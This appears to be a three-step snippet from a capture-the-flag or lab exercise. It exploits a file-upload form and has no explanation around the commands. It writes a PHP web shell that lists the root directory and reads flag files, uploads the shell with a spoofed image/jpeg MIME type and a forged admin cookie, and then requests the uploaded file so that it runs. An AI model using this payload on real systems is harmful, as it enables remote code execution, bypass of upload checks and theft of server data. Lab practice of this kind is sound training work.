# 1. Create a test payload
echo '<?php system("ls -la /; cat /flag*"); ?>' > shell.php

# 2. Upload it (forcing JPEG MIME type)
curl 'http://10.39.42.166/index.php?page=upload' \
  -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' \
  -F 'MAX_FILE_SIZE=100000' \
  -F 'uploaded=@shell.php;type=image/jpeg' \
  -F 'Upload=Upload'

# 3. Check where it was uploaded
curl 'http://10.39.42.166/uploads/shell.php'